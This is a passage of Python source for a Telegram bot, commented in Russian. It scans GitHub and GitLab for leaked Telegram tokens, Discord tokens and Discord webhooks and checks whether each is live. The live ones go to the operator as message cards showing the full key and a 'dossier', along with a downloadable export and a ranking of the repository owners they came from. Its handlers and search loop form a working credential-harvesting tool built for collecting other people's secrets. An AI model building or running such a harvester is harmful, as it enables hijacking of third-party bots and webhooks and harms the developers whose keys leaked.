    buf = io.BytesIO()
    for item in live_tokens:
        line = (
            f"[{item.get('type', 'TG')}] "
            f"@{item.get('bot', 'unknown')} | "
            f"{item.get('token', '')} | "
            f"{item.get('url', '')} | "
            f"scam={item.get('scam', False)}\n"
        )
        buf.write(line.encode("utf-8"))
    buf.seek(0)
    filename = f"live_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    buf.name = filename

    if chat_id:
        bot.send_document(chat_id, buf, visible_file_name=filename)


@bot.callback_query_handler(func=lambda call: call.data == "clear_seen")
def cb_clear_seen(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    clear_seen_tokens()
    add_log("🧹 Кэш seen_tokens.txt очищен пользователем")
    bot.answer_callback_query(call.id, "Кэш проверенных токенов очищен!")


@bot.callback_query_handler(func=lambda call: call.data == "show_chart")
def cb_show_chart(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id, "Строю график...")
    buf = generate_stats_chart()
    if chat_id:
        bot.send_photo(chat_id, buf, caption="📊 Статистика поиска")


@bot.callback_query_handler(func=lambda call: call.data == "show_top5")
def cb_show_top5(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пока пуста.")
        return

    bot.answer_callback_query(call.id, "Собираю топ...")
    owners = []
    for item in live_tokens:
        repo = str(item.get("repo", ""))
        if "/" in repo:
            owners.append(repo.split("/", 1)[0])
        elif repo:
            owners.append(repo)

    top = Counter(owners).most_common(5)
    lines = ["🏆 <b>Топ-5 источников по находкам:</b>\n"]
    for idx, (owner, count) in enumerate(top, 1):
        safe_owner = html.escape(owner)
        if owner.startswith("gitlab/"):
            lines.append(f"{idx}. <code>{safe_owner}</code> — <b>{count}</b>")
        else:
            lines.append(
                f"{idx}. <a href='https://github.com/{urllib.parse.quote(owner)}'>{safe_owner}</a> — <b>{count}</b>"
            )

    if chat_id:
        bot.send_message(
            chat_id,
            "\n".join(lines),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


@bot.callback_query_handler(func=lambda call: call.data == "stop_search_btn")
def cb_stop_search(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    with state_lock:
        search_state["stop_requested"] = True
        search_state["status_text"] = "Остановка..."
    bot.answer_callback_query(call.id, "Останавливаю поиск...")


@bot.callback_query_handler(func=lambda call: call.data == "force_update")
def cb_force_update(call: types.CallbackQuery):
    chat_id = call.message.chat.id if call.message else None
    user_id = call.from_user.id if call.from_user else None
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Доступ запрещён", show_alert=True)
        return

    bot.answer_callback_query(call.id, "Обновлено")
    if call.message:
        update_progress_message(call.message.chat.id, call.message.message_id)


# =====================================================================
# ЗАПУСК ПОИСКА И ПАРАЛЛЕЛЬНАЯ ОБРАБОТКА НАХОДОК
# =====================================================================
@bot.message_handler(func=lambda m: m.text == "🚀 Начать поиск")
def start_search_command(message: types.Message):
    if not is_admin(message.chat.id, message.from_user.id if message.from_user else None):
        return

    with state_lock:
        if search_state["is_searching"]:
            bot.send_message(message.chat.id, "⚠️ Поиск уже запущен!")
            return

        search_state.update({
            "is_searching": True,
            "stop_requested": False,
            "found_live_current": 0,
            "checked_tokens": 0,
            "dead_tokens": 0,
            "scam_tokens": 0,
            "start_time": time.time(),
            "current_query": "Подготовка запроса...",
            "status_text": "Запуск...",
            "logs": [],
            "phrase": "Инициализация сканера...",
        })

    # Пробуем заранее прогреть подключение к Google Sheets, чтобы сразу увидеть статус
    if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
        threading.Thread(target=get_google_worksheet, daemon=True).start()

    msg = bot.send_message(
        message.chat.id,
        "⏳ <b>Инициализация сканера...</b>",
        parse_mode="HTML",
    )
    threading.Thread(
        target=live_ui_updater,
        args=(message.chat.id, msg.message_id),
        daemon=True,
    ).start()
    threading.Thread(
        target=run_search_task,
        args=(message.chat.id, msg.message_id),
        daemon=True,
    ).start()


def live_ui_updater(chat_id: int, msg_id: int) -> None:
    spinner_idx = 0
    while True:
        with state_lock:
            active = search_state["is_searching"] and not search_state["stop_requested"]
            if active:
                search_state["phrase"] = random.choice(HACKER_PHRASES)
        if not active:
            break

        update_progress_message(chat_id, msg_id, spinner_idx)
        spinner_idx += 1
        _sleep_respecting_stop(3)


def update_progress_message(chat_id: int, msg_id: int, spinner_idx: int = 0) -> None:
    snap = get_state_snapshot()
    spinner = SPINNERS[spinner_idx % len(SPINNERS)]

    logs_raw = "\n".join(snap["logs"]) if snap["logs"] else "> Ожидание событий..."
    safe_logs = html.escape(logs_raw)
    safe_query = html.escape(str(snap["current_query"]))
    safe_phrase = html.escape(str(snap["phrase"]))
    safe_status = html.escape(str(snap["status_text"]))

    limit_str = "∞" if snap["limit_live"] >= 999 else str(snap["limit_live"])

    text = (
        f"{spinner} <b>Кибер-поиск запущен...</b>\n\n"
        f"⏱ Время: <code>{html.escape(snap['time'])}</code> | "
        f"🔍 Проверено: <code>{snap['checked_tokens']}</code>\n"
        f"🟢 Живых: <code>{snap['found_live_current']} / {limit_str}</code> | "
        f"⚠️ Скам: <code>{snap['scam_tokens']}</code>\n"
        f"📌 Статус: <code>{safe_status}</code>\n\n"
        f"📡 Запрос: <code>{safe_query}</code>\n\n"
        f"📟 <b>Консоль событий ({MAX_LOG_LINES} строк):</b>\n"
        f"<pre>{safe_logs}</pre>\n"
        f"⚙️ <i>{safe_phrase}</i>"
    )

    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=text,
            parse_mode="HTML",
            reply_markup=get_progress_buttons(),
        )
    except Exception:
        pass


def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
    with state_lock:
        if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
            return

    f_type = finding.get("type", "")
    token = finding.get("token", "")
    repo = finding.get("repo", "unknown")
    url = finding.get("url", "")

    add_log(f"🔍 Проверка {f_type} из {repo[:24]}...")

    if f_type == "Telegram":
        is_live, bot_name, is_scam, dossier = check_telegram_token(token)
    elif f_type == "Discord":
        is_live, bot_name, is_scam, dossier = check_discord_token(token)
    elif f_type == "Webhook":
        is_live, bot_name = check_discord_webhook(token)
        is_scam = True
        dossier = "🪝 Активный Discord Webhook (часто используется для слива данных)"
    else:
        return

    with state_lock:
        search_state["checked_tokens"] += 1
        if not is_live:
            search_state["dead_tokens"] += 1
            add_log(f"❌ Мёртвый {f_type}")
            return

        if search_state["found_live_current"] >= search_state["limit_live"]:
            return

        search_state["found_live_current"] += 1
        current_found = search_state["found_live_current"]
        current_limit = search_state["limit_live"]
        if is_scam:
            search_state["scam_tokens"] += 1

    token_info = {
        "type": f_type,
        "token": token,
        "repo": repo,
        "url": url,
        "bot": bot_name or "Unknown",
        "scam": is_scam,
    }
    save_live_token(token_info)
    add_log(f"🟢 БИНГО! {f_type}: {bot_name}")

    safe_type = html.escape(f_type)
    safe_bot = html.escape(str(bot_name or "Unknown"))
    safe_token = html.escape(token)
    safe_repo = html.escape(repo)
    safe_url = html.escape(url, quote=True)
    scam_badge = "⚠️ СКАМ / ПОДОЗРИТЕЛЬНО" if is_scam else "✅ НОРМ"
    limit_str = "∞" if current_limit >= 999 else str(current_limit)

    # dossier уже содержит безопасный HTML с экранированными полями
    card_text = (
        f"🚨 <b>НАЙДЕН {safe_type}!</b> ({current_found}/{limit_str})\n\n"
        f"🤖 Имя / Цель: <b>{safe_bot}</b>\n"
        f"🏷 Статус: {scam_badge}\n"
        f"📦 Репозиторий: <code>{safe_repo}</code>\n"
        f"🔗 <a href='{safe_url}'>Открыть источник</a>\n"
        f"🔑 Ключ: <code>{safe_token}</code>\n\n"
        f"📄 <b>Досье:</b>\n{dossier}"
    )

    try:
        bot.send_message(
            chat_id,
            card_text,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as exc:
        add_log(f"⚠️ Не удалось отправить карточку в TG: {exc}")


def run_search_task(chat_id: int, msg_id: int) -> None:
    try:
        while True:
            with state_lock:
                if search_state["stop_requested"]:
                    search_state["status_text"] = "Остановлено пользователем"
                    break
                if search_state["found_live_current"] >= search_state["limit_live"]:
                    search_state["status_text"] = "Лимит находок достигнут"
                    break
                search_state["status_text"] = "Поиск в репозиториях..."

            raw_findings, code = search_github_dynamic()
            if code == 401:
                break

            with state_lock:
                still_active = (
                    not search_state["stop_requested"]
                    and search_state["found_live_current"] < search_state["limit_live"]
                )

            if still_active and random.random() < 0.35:
                raw_findings.extend(search_gitlab())

            if not raw_findings:
                continue

            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = [
                    executor.submit(process_single_finding, item, chat_id)
                    for item in raw_findings
                ]
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        fut.result()
                    except Exception as exc:
                        add_log(f"⚠️ Ошибка в воркере проверки: {exc}")

                    with state_lock:
                        if (
                            search_state["stop_requested"]
                            or search_state["found_live_current"] >= search_state["limit_live"]
                        ):
                            break

    finally:
        with state_lock:
            search_state["is_searching"] = False
            elapsed = (
                time.time() - search_state["start_time"]
                if search_state["start_time"]
                else 0
            )
            found_final = search_state["found_live_current"]
            checked_final = search_state["checked_tokens"]
            status_final = html.escape(search_state["status_text"])

        final_text = (
            f"🏁 <b>Поиск завершён.</b>\n"
            f"📌 Причина: <code>{status_final}</code>\n"
            f"⏱ Время: <code>{format_time(elapsed)}</code>\n"
            f"🔍 Проверено: <code>{checked_final}</code>\n"
            f"🟢 Найдено живых: <code>{found_final}</code>"
        )
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=final_text,
                parse_mode="HTML",
                reply_markup=None,
            )
        except Exception:
            pass


# =====================================================================
# ЗАПУСК ПОЛЛИНГА БОТА (УСТОЙЧИВОСТЬ К 409 CONFLICT) AND FLASK
# =====================================================================
def run_bot_polling() -> None:
    try:
        bot.remove_webhook()
    except Exception:
        pass

    conflict_streak = 0
    while True:
        try:
            bot.infinity_polling(
                timeout=30,
                long_polling_timeout=25,
                skip_pending=True,
                logger_level=None,
            )
            conflict_streak = 0
        except apihelper.ApiTelegramException as api_err:
            err_str = str(api_err)
            if "409" in err_str or "Conflict" in err_str:
                conflict_streak += 1
                wait_time = min(15 * conflict_streak, 120)
                print(
                    f"[BOT] 409 Conflict (другой экземпляр бота уже опрашивает TG). "
                    f"Повтор через {wait_time}с...",
                    flush=True,
                )
                time.sleep(wait_time)
            else:
                print(f"[BOT] Telegram API ошибка: {api_err}. Повтор через 5с...", flush=True)
                time.sleep(5)
        except Exception as exc:
            print(f"[BOT] Неожиданная ошибка polling: {exc}. Повтор через 5с...", flush=True)
            time.sleep(5)


if __name__ == "__main__":
    # Проверяем Google Sheets при старте (если настроены переменные)
    if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
        threading.Thread(target=get_google_worksheet, daemon=True).start()

    # Запускаем Telegram-бота в фоновом потоке
    threading.Thread(target=run_bot_polling, daemon=True).start()

    # Запускаем веб-сервер Flask для Render / healthcheck
    port = int(os.environ.get("PORT", "10000"))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
